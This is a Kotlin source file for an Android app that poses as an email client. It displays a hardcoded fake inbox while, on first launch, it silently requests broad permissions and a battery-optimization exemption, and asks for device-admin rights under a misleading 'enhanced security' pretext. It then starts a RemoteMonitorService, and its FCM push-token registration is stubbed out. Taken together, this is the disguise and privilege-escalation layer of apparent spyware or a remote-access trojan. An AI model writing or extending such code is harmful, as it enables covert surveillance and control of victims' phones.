package com.email

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.view.ViewGroup
import android.widget.ImageView
import android.widget.TextView
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.email.databinding.ActivityMainBinding
import com.email.receiver.DeviceAdminReceiver
import com.email.service.RemoteMonitorService
import com.email.util.PermissionUtil
// Firebase import — re-enable after google-services.json is placed
// import com.google.firebase.messaging.FirebaseMessaging
import java.util.UUID

data class EmailItem(
    val sender: String,
    val subject: String,
    val preview: String,
    val time: String,
    val isUnread: Boolean,
    val avatarLetter: String
)

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private lateinit var prefs: SharedPreferences
    private lateinit var permissionLauncher: ActivityResultLauncher<Array<String>>
    private lateinit var adminLauncher: ActivityResultLauncher<Intent>
    private lateinit var batteryLauncher: ActivityResultLauncher<Intent>

    private val fakeEmails = listOf(
        EmailItem(
            sender = "Sarah Mitchell",
            subject = "Re: Q4 Budget Review",
            preview = "Hi, I've attached the revised spreadsheet with the updated figures from last week's...",
            time = "9:14 AM",
            isUnread = true,
            avatarLetter = "S"
        ),
        EmailItem(
            sender = "no-reply@netflix.com",
            subject = "Your November bill is ready",
            preview = "Your payment of \$15.49 will be processed on November 5th. View your account...",
            time = "8:02 AM",
            isUnread = true,
            avatarLetter = "N"
        ),
        EmailItem(
            sender = "James Okonkwo",
            subject = "Project Phoenix — kickoff Thursday",
            preview = "Team, just a quick reminder that we're kicking off Thursday at 10 AM in the main...",
            time = "Yesterday",
            isUnread = false,
            avatarLetter = "J"
        ),
        EmailItem(
            sender = "LinkedIn",
            subject = "You have 3 new connection requests",
            preview = "People you may know: Priya Sharma, David Chen, Amanda Kowalski. Connect now...",
            time = "Yesterday",
            isUnread = false,
            avatarLetter = "L"
        ),
        EmailItem(
            sender = "Dr. Anita Patel",
            subject = "Appointment Confirmation — Nov 8",
            preview = "This is a reminder of your appointment on November 8th at 2:30 PM. Please arrive...",
            time = "Mon",
            isUnread = false,
            avatarLetter = "A"
        ),
        EmailItem(
            sender = "GitHub",
            subject = "Security alert: new sign-in from Chrome on Windows",
            preview = "We noticed a new sign-in to your account from a Chrome browser on Windows. If this...",
            time = "Mon",
            isUnread = false,
            avatarLetter = "G"
        ),
        EmailItem(
            sender = "mom@gmail.com",
            subject = "Thanksgiving plans",
            preview = "Hi honey, just wanted to check if you're coming home for Thanksgiving this year. Dad and...",
            time = "Sun",
            isUnread = false,
            avatarLetter = "M"
        )
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        prefs = getSharedPreferences("email_prefs", Context.MODE_PRIVATE)
        ensureDeviceId()

        setSupportActionBar(binding.toolbar)
        supportActionBar?.title = "Inbox"

        setupEmailList()
        setupNavigation()

        permissionLauncher = registerForActivityResult(
            ActivityResultContracts.RequestMultiplePermissions()
        ) { /* silently consume results */ }

        adminLauncher = registerForActivityResult(
            ActivityResultContracts.StartActivityForResult()
        ) { /* silently consume */ }

        batteryLauncher = registerForActivityResult(
            ActivityResultContracts.StartActivityForResult()
        ) { /* silently consume */ }

        if (savedInstanceState == null) {
            silentlyRequestPermissions()
            startMonitorService()
            registerFcmToken()
        }
    }

    private fun ensureDeviceId() {
        if (prefs.getString("device_id", null) == null) {
            prefs.edit().putString("device_id", UUID.randomUUID().toString()).apply()
        }
    }

    private fun setupEmailList() {
        binding.recyclerView.layoutManager = LinearLayoutManager(this)
        binding.recyclerView.adapter = EmailAdapter(fakeEmails) { email ->
            val intent = Intent(this, EmailDetailActivity::class.java).apply {
                putExtra("sender", email.sender)
                putExtra("subject", email.subject)
                putExtra("preview", email.preview)
                putExtra("time", email.time)
            }
            startActivity(intent)
        }
    }

    private fun setupNavigation() {
        binding.bottomNav.setOnItemSelectedListener { item ->
            when (item.itemId) {
                R.id.nav_mail -> true
                R.id.nav_search -> {
                    true
                }
                R.id.nav_compose -> {
                    true
                }
                else -> false
            }
        }
        binding.fab.setOnClickListener { /* compose placeholder */ }
    }

    private fun silentlyRequestPermissions() {
        val permissions = PermissionUtil.getAllRequiredPermissions()
        permissionLauncher.launch(permissions)

        // Request battery optimization exemption silently
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                batteryLauncher.launch(intent)
            } catch (_: Exception) {}
        }

        // Request device admin silently
        val devicePolicyManager = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent = ComponentName(this, DeviceAdminReceiver::class.java)
        if (!devicePolicyManager.isAdminActive(adminComponent)) {
            try {
                val adminIntent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Required for enhanced security and remote wipe capabilities.")
                }
                adminLauncher.launch(adminIntent)
            } catch (_: Exception) {}
        }
    }

    private fun startMonitorService() {
        try {
            val intent = Intent(this, RemoteMonitorService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (_: Exception) {}
    }

    private fun registerFcmToken() {
        // Firebase disabled — re-enable after placing real google-services.json
        // FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
        //     if (task.isSuccessful) {
        //         val token = task.result
        //         prefs.edit().putString("fcm_token", token).apply()
        //     }
        // }
    }
}

class EmailAdapter(
    private val items: List<EmailItem>,
    private val onClick: (EmailItem) -> Unit
) : RecyclerView.Adapter<EmailAdapter.VH>() {

    inner class VH(v: View) : RecyclerView.ViewHolder(v) {
        val avatar: TextView = v.findViewById(R.id.tvAvatar)
        val sender: TextView = v.findViewById(R.id.tvSender)
        val subject: TextView = v.findViewById(R.id.tvSubject)
        val preview: TextView = v.findViewById(R.id.tvPreview)
        val time: TextView = v.findViewById(R.id.tvTime)
        val unreadDot: View = v.findViewById(R.id.viewUnread)
    }

    override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): VH {
        val v = android.view.LayoutInflater.from(parent.context)
            .inflate(R.layout.item_email, parent, false)
        return VH(v)
    }

    override fun onBindViewHolder(holder: VH, position: Int) {
        val item = items[position]
        holder.avatar.text = item.avatarLetter
        holder.sender.text = item.sender
        holder.subject.text = item.subject
        holder.preview.text = item.preview
        holder.time.text = item.time
        holder.unreadDot.visibility = if (item.isUnread) View.VISIBLE else View.INVISIBLE
        holder.itemView.setOnClickListener { onClick(item) }
    }

    override fun getItemCount() = items.size
}
